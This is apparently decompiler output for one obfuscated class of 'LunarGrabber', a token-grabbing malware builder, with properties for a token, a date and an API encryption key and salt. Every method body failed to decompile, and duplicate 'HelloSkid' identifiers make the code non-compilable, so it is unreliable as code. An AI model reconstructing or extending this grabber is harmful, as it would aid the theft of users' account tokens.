﻿// Decompiled with JetBrains decompiler
// Type: EFC4D0A3
// Assembly: LunarGrabber, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F156DE2-B4D0-4210-84CA-FF98CDA75F13
// Assembly location: C:\Users\jayde\OneDrive\Desktop\CT-Dev.MT\ZeroStance\Grabbers (Builders)\LunarGrabber_v2\LunarGrabber.exe

using System;

internal class EFC4D0A3
{
  public static bool HelloSkid;
  public static bool HelloSkid;
  public static string HelloSkid;
  public static string HelloSkid;
  public static string HelloSkid;
  public static bool HelloSkid;
  public static Random HelloSkid;

  public static string Token
  {
    get
    {
      // ISSUE: unable to decompile the method.
    }
    set
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public static string Date
  {
    get
    {
      // ISSUE: unable to decompile the method.
    }
    set
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public static string APIENCRYPTKEY
  {
    get
    {
      // ISSUE: unable to decompile the method.
    }
    set
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public static string APIENCRYPTSALT
  {
    get
    {
      // ISSUE: unable to decompile the method.
    }
    set
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public static string HelloSkid(int HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  public static string HelloSkid()
  {
    // ISSUE: unable to decompile the method.
  }

  public EFC4D0A3()
  {
    // ISSUE: unable to decompile the method.
  }

  static EFC4D0A3()
  {
    // ISSUE: unable to decompile the method.
  }
}
